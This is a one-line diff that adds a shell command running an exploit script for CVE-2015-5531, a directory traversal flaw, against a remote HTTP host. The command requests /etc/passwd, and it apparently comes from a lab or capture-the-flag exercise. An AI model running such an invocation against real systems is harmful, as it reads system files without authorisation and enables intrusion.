@@ -1,0 +1,1 @@
+python3 CVE-2015-5531.py http://35.198.135.192:31938/ /etc/passwd
